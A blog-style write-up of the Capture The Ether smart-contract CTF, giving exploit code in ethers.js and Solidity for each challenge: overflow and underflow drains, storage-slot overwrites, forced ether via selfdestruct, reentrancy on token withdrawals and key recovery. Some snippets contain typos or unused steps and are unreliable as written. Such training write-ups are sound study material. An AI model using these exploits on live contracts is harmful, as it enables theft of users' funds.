---
layout: page
title: Capture The Ether
permalink: /capture-the-ether/
---

# Capture The Ether Write-up

## Warmup
### Deploy a contract
Follow the instructions on the website.

### Call me
Interact with the Ethereum blockchain using ethers.js, a Javascript library. Complete the Hardhat tutorial to learn the basics of ethers.js.
```
<!-- Javascript -->
Challenge = await ethers.getContractFactory('CallMeChallenge');
challenge = await Challenge.attach('0xAB528Da6B558f63b0Cb8A7FE9FE684dbB7038417');
tx = await challenge.callme();
await tx.wait();
```

### Choose a nickname
Nickname needs to converted from `string` to `bytes32` before passing it into `setNickname()` function.
```
<!-- Javascript -->
CTE = await ethers.getContractFactory('CaptureTheEther');
cte = await CTE.attach('0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee');
tx = await cte.setNickname(ethers.utils.formatBytes32String('bytera'));
await tx.wait();
```


## Lotteries
### Guess the number
The answer for the lottery is hardcoded.
```
<!-- Javascript -->
tx = challenge.guess(42, {value:ethers.utils.parseEther('1')});
await tx.wait();
```

### Guess the secret number
Hash of the correct answer is hardcoded and can `uint8` can easily be brute forced.
```
<!-- Javascript -->
answerHash = '0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365'
for (let i = 0; i < 2**8; i++) {
    if (ethers.utils.keccak256(i) === answerHash) {
        tx = await challenge.guess(i, {value:ethers.utils.parseEther('1')});
        await tx.wait();
        break;
    }
}
```

### Guess the random number
Although variables not declared as `public` cannot be accessed or modified by other contracts, they are still visible to everyone. Variables are stored in what are known as slots and stored sequentially with the first variable stored in slot 0, second variable stored in slot 1, and so on. The answer can be retrieved by reading the data stored in slot 0, which is in bytes, and converting it into an integer.
```
<!-- Javascript -->
answer = await ethers.provider.getStorageAt(challenge.address, 0);
tx = await challenge.guess(ethers.BigNumber.from(answer), {values:ethers.utils.parseEther('1')});
await tx.wait();
```
#### Reference
- <https://docs.soliditylang.org/en/v0.4.21/contracts.html#visibility-and-getters>{:target="_blank"}

### Guess the new number
Since the answer is computed when `guess()` function is called, the challenger can create a contract to call the `guess()` function with the exact same instructions `uint8(keccak256(block.blockhash(block.number - 1), now))` as the argument.
```
<!-- Solidity -->
function exploit(address _challenge) external payable {
    IChallenge(_challenge).guess.value(msg.value)(uint8(keccak256(block.blockhash(block.number - 1), now)));
    require(this.balance == 2 ether);
}
```

### Predict the future
Since the answer is computed when `settle()` function is called, the challenger can continue to call `settle()` and revert the transaction until `answer` equals `guess`. Having 10 possible answer only exacerbates the likelihood of a match in a short period of time.
```
<!-- Solidity -->
function exploit(address _challenge) external {
    IChallenge(_challenge).settle();
    require(address(this).balance == 2);
}
```

### Predict the blockhash
The `block.blockhash()` function only stores the hash for the 256 most recent blocks and any other blocks will return a value of 0.
1. Call `lockInGuess()` function with `bytes32(0)` as the argument.
2. Wait for more than 256 blocks to have been mined.
3. Call `settle()` function.

#### Reference
- <https://docs.soliditylang.org/en/v0.4.21/units-and-global-variables.html#special-variables-and-functions>{:target="_blank"}


## Math
### Token sale
The `buy()` function can cause an integer overflow and allows tokens to be bought for less than 1 ether.
1. Compute `numTokens` required to overflow `numTokens * PRICE_PER_TOKEN`.
    - 2<sup>256</sup> / 10<sup>18</sup> + 1
2. Compute the overflowed value.
    - (2<sup>256</sup> / 10<sup>18</sup> + 1) x 10<sup>18</sup> - 2<sup>256</sup>
3. Call `buy()` function with `numTokens` as 1. and `msg.value` as 2.
4. The attacker will have 115792089237316195423570985008687907853269984665640564039458 tokens.
5. Sell 1415992086870360064 tokens to retrieve all ethers in `TokenSaleChallenge` contract.

```
<!-- Javascript -->
numTokens = ethers.constants.MaxUint256.div(ethers.utils.parseEther('1')).add(1);
msgValue = numTokens.mul(ethers.utils.parseEther('1')).sub(ethers.constants.MaxUint256.add(1));
tx = await challenge.buy(numTokens, {value: msgValue});
await tx.wait();
numTokens = (await ethers.provider.getBalance(challenge.address)).div(ethers.utils.parseEther('1'));
tx = await challenge.sell(numTokens);
await tx.wait();
```
#### Reference
- <https://github.com/sigp/solidity-security-blog#ouflow>{:target="_blank"}

### Token whale
The `balanceOf` is susceptible to an integer underflow in the `_transfer()` function. A challenger with the help of an accomplice can approve tokens and then call `transferFrom()` function to cause token balance of the approved user to underflow.
1. Transfer 1000 tokens from challenger account (challenger1) to another challenger controlled account (challenger2).
2. Call `approve()` function from challenger2 and approve 1 token for challenger1 to transfer.
3. Challenger1 calls `transferFrom()` function to transfer 1 token from challenger2 to any random address other than challenger1.
4. Challenger1 now has 2<sup>256</sup> - 1 tokens.

```
<!-- Javascript -->
[attacker1, attacker2] = await ethers.getSigners();
tx = await challenge.transfer(attacker2.address, 1000);
await tx.wait();
tx = await challenge.connect(attacker2).approve(attacker1.address, 1);
await tx.wait();
tx = await challenge.transferFrom(attacker2.address, ethers.constants.AddressZero, 1);
await tx.wait();
```
#### Reference
- <https://github.com/sigp/solidity-security-blog#ouflow>{:target="_blank"}

### Retirement fund
The variable `withdrawn` inside `collectPenalty()` function is vulnerable to an integer underflow. A challenger can force send ether to the contract to bypass `require(withdrawn > 0)` condition to withdraw all ethers inside the contract.
1. Create a challenger owned contract with 1 wei and `selfdestruct()` functionality.
2. Destroy the challenger owned contract and send the 1 wei to `RetirementFundChallenge` contract.
3. `startBalance` equals 10<sup>18</sup> and `address(this).balance` equals 10<sup>18</sup> + 1.
4. `withdrawn` will underflow and equal 2<sup>256</sup> - 1.
5. Call collectPenalty() to retrieve all ethers inside `RetirementFundChallenge` contract.

```
<!-- Solidity -->
function exploit(address _challenge) payable {
    reqire(msg.value > 0);
    selfdestruct(_challenge);
}
```
#### Reference
- <https://github.com/sigp/solidity-security-blog#ether>{:target="_blank"}
- <https://github.com/sigp/solidity-security-blog#ouflow>{:target="_blank"}

### Mapping
The variable `isComplete` can be modified by expanding the dynamic array `map`. Dynamic array use Keccak-256 hash to find the starting slot position of the array elements. The first element will start at `keccak256(p)` where `p` is the slot location of the array itself. In some cases, the slot position of an array element can overlap with state variables and unintentionally or intentionally overwrite it.
1. Call `set()` function with 2<sup>256</sup> - 2 as the `key` to increase `map.length` to 2<sup>256</sup> - 1.
2. All slots will be correspond to an element in `map`.
3. Slot 0 is equivalent to slot 2<sup>256</sup> due to an integer overflow.
4. Index corresponding to slot 0, where `isComplete` is located, can be calculated by 2<sup>256</sup> - Keccak256(1).
5. Call `set()` function with key of 35707666377435648211887908874984608119992236509074197713628505308453184860938 and value of 1 to overwrite `isComplete` to true.

```
<!-- Javascript -->
tx = await challenge.set(ethers.BigNumber.from('2').pow('256').sub(2), 1);
await tx.wait();
index = ethers.BigNumber.from('2').pow('256').sub(ethers.utils.solidityKeccak256(['uint'], [1]));
await tx.wait();
```
#### Reference
- <https://docs.soliditylang.org/en/v0.4.21/miscellaneous.html#layout-of-state-variables-in-storage>{:target="_blank"}

### Donation
The `donate()` function contains unintialized storage variable that can intentionally or unintentionally overwrite other state variables in the contract. Since unintialized storage variables default to slot 0, `donation.timestamp` will point to the length of `donation` and `donation.etherAmount` will point to `owner`. A challenger can call `donate()` with their address converted to type `uint` as an argument and overwriting `owner` to the challenger address. Incidentally, allowing the challenger to call `withdraw()` function.
1. Convert challenger address to type `uint`.
2. Divide `uint` representation of the address by `scale` to calculate `msg.value` needed to meet the condition `require(msg.value == etherAmount / scale)`.
3. Call `donate()` function with `uint` converted address as `etherAmount` and required ether calculated in step 2.
4. Call `withdraw()` function to retrieve all ether in the contract.

```
<!-- Javascript -->
addressNumber = ethers.BigNumber.from(challenger.address);
tx = await challenge.donate(addressNumber,{value:addressNumber.div(ethers.BigNumber.from('10').pow('36'))});
await tx.wait();
tx = await challenge.withdraw();
await tx.wait();
```
#### Reference
- <https://github.com/sigp/solidity-security-blog#storage>{:target="_blank"}

### Fifty years
The `upsert()` function contains uninitialized storage variable that can intentionally or unintentionally overwrite other state variables in the contract. Unintialized storage variable default to slot 0, thereby `contribution.amount` points to the length of queue and `contribution.unlockTimestamp` points to `head`. A challenger can call `upsert()` to manipulate the length of `queue` with `msg.value` and `head` with the `timestamp` argument.  
The `upsert()` also contains an integer overflow vulnerability in the condition `require(timestamp >= queue[queue.length - 1].unlockTimestamp + 1 days)`. If a challenger calls `upsert()` with `timestamp` of 2<sup>256</sup> - 86400, they can call `upsert()` again with `timestamp` as 0 because the `queue[queue.length - 1].unlockTimestamp + 1 days)` will overflow to 0. The challenger can now withdraw the ethers inside the contract without waiting.
1. Calculate 2<sup>256</sup> - 86400 (days in seconds) which is 115792089237316195423570985008687907853269984665640564039457584007913129553536.
2. Call `upsert()` function with the `index` parameter as 1, `timestamp` parameter as the value calculated in step 1, and `msg.value` as 1 wei.
3. The variable `queue.length` in slot 0 will be overwritten to 1 because `contribution.amount = msg.value` also points to slot 0.
4. The variable `head` in slot 1 will be overwritten to the value calculated in step 1 because `contribution.unlockTimestamp = timestamp` also points to slot 1.
5. The method `.push()` increases `queue.length` to 2.
6. The increased `queue.length` of 2 and `timestamp` of 115792089237316195423570985008687907853269984665640564039457584007913129553536 is pushed to `queue` to `contribution.amount` and `contribution.unlockTimestamp` respectively.
7. Call `upsert()` function with the `index` parameter as 2, `timestamp` parameter as 0, and `msg.value` as 1 wei.
8. `queue[queue.length - 1].unlockTimestamp` equals the value calculated in step 1 and when 86400 is added, will overflow and equal 0.
9. Similar to step 3, `queue.length` in slot 0 will be overwritten from 2 to 1, thereby removing the element at index 1.
10. Similar to step 4, `head` in slot 1 will be overwritten from the value in step 1 to 0.
11. Call `withdraw()` function with `index` of 1 to withdraw all ethers in the contract.

```
<!-- Javascript -->
overflowTimestamp = ethers.BigNumber.from('2').pow('256').sub(ethers.BigNumber.from('86400'))
tx = await challenge.upsert(1, overflowTimestamp, {value:1});
await tx.wait();
tx = await challenge.upsert(2, 0, {value:1});
await tx.wait();
tx = await challenge.withdraw(1);
await tx.wait();
```
#### Reference
- <https://github.com/sigp/solidity-security-blog#storage>{:target="_blank"}
- <https://github.com/sigp/solidity-security-blog#ouflow>{:target="_blank"}


## Accounts
### Fuzzy identity
A challenger can call `authenticate()` by creating a contract with a function `name()` that returns `bytes32("smarx")` and deploying the contract only if the precomputed contract address contains the string `badc0de`.
```
<!-- Solidity -->
contract FuzzyIdentityExploit {
    bytes32 public name = bytes32("smarx");
    function exploit(address _challenge) public {
        IFuzzyIdentityChallenge(_challenge).authenticate();
    }
}
```
```
<!-- Javascript -->
while (true) {
    wallet = new ethers.Wallet(ethers.Wallet.createRandom().privateKey, ethers.provider);
    exploitAddress = ethers.utils.getContractAddress({from:wallet.address, nonce:0});
    if (exploitAddress.includes('badc0de')) {
        Exploit = await ethers.getContractFactory('FuzzyIdentityExploit', wallet);
        exploit = await Exploit.deploy();
        await exploit.deployed();
        tx = await exploit.authenticate(challenge.address);
        await tx.wait();
        break;
    }
}
```
#### Reference
- <https://ethereum.stackexchange.com/questions/760/how-is-the-address-of-an-ethereum-contract-computed>{:target="_blank"}

### Public Key
Public key can be computed from signatures of historical transaction. With the public key, the challenger can call `authenticate()` function.
```
<!-- Javascript -->
txHash = '0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb'
tx = await ethers.provider.getTransaction(txHash);
expandedSig = {
    r: tx.r,
    s: tx.s,
    v: tx.v,
}
sig = ethers.utils.joinSignature(expandedSig);
txData = {
    gasPrice: tx.gasPrice,
    gasLimit: tx.gasLimit,
    value: tx.value,
    nonce: tx.nonce,
    data: tx.data,
    chainId: tx.chainId,
    to: tx.to,
}
raw = ethers.utils.serializeTransaction(txData);
msgHash = ethers.utils.keccak256(raw);  
msgBytes = ethers.utils.arrayify(msgHash);
recoveredPubKey = ethers.utils.recoverPublicKey(msgBytes, sig);

tx = await challenge.authenticate(ethers.utils.hexDataSlice(recoveredPubKey, 1));
await tx.wait();
```
#### Reference
- <https://ethereum.stackexchange.com/questions/13778/get-public-key-of-any-ethereum-account/79174>{:target="_blank"}

### Account Takeover
The private key of the `owner` can be calculated becuase the account uses the same r value for the signature. Ethereum uses Elliptic Curve Digital Signature Algorithm (ECDSA) to validate the origin and integrity of the message. This ECDSA generates a signature pair (r,s). Implementing the same r value for different signature renders the algorithm useless and allows the recovery of private key. Multiple proof of concepts have been written showing how to retrieve the private key and detailing the dangers of this insecure implementation. Because I don't fully understand the math to calculate the private key and I used a script on Github, I will leave the explanation of this challenge at that for now.
#### Reference
- <https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm#Security>{:target="_blank"}
- <https://bitcoin.stackexchange.com/questions/35848/recovering-private-key-when-someone-uses-the-same-k-twice-in-ecdsa-signatures>{:target="_blank"}
- <https://web.archive.org/web/20160308014317/http://www.nilsschneider.net/2013/01/28/recovering-bitcoin-private-keys.html>{:target="_blank"}


## Miscellaneous
### Assume ownership
The function `AssumeOwmershipChallenge()` is not a constructor because the name is different from the contract name and can be call by anyone to become the owner.
```
<!-- Javascript -->
tx = await challenge.AssumeOwmershipChallenge();
await tx.wait();
tx = await challenge.authenticate();
await tx.wait();
```
#### Reference
- <https://github.com/sigp/solidity-security-blog#constructors>{:target="_blank"}

### Token bank
The `withdraw()` function in the `TokenBankChallenge` contract is vulnerable to reentrancy because when token is transferred, the token contract makes an external call to the recipient if the recipient is a contract and `balanceOf[msg.sender] -= amount` doesn't updates until after the transfer.
1. Prepare a contract that implements `tokenFallback()` function which calls the `withdraw()` function in `TokenBankChallenge` contract only when `from` parameter is the address of `TokenBankChallenge`.
2. Challenger calls `withdraw()` function in `TokenBankChallenge` contract to transfer ownership of token to themself.
3. Challenger transfers their tokens to the contract prepared in step 1.
4. Transfer the tokens from the challenger owned contract to `TokenBankChallenge` contract.
5. Call `withdraw()` in `TokenBankChallenge` from the challenger controlled contract to withdraw all tokens it owns.
6. Token contract will call `tokenFallback()` function in the challenger owned contract which calls `withdraw()` in `TokenBankChallenge` again.
7. Repeat this process if necessary, until all tokens owned by `TokenBankChallenge` is depleted.

```
<!-- Solidity -->
function tokenFallback(address from, uint256 value, bytes) public {
  if (from == address(challenge) && challenge.token().balanceOf(challenge) > 0) {
      challenge.withdraw(value);
  }
}
function exploit(uint256 amount) public {
  challenge.token().transfer(challenge, amount);
  challenge.withdraw(amount);
}
```
```
<!-- Javascript -->
tx = await token['transfer(address,uint256)'](exploit.address, ethers.utils.parseEther('500000'));
await tx.wait();
tx = await exploit.exploit(ethers.utils.parseEther('500000'));
await tx.wait();
```
#### Reference
- <https://github.com/sigp/solidity-security-blog#reentrancy>{:target="_blank"}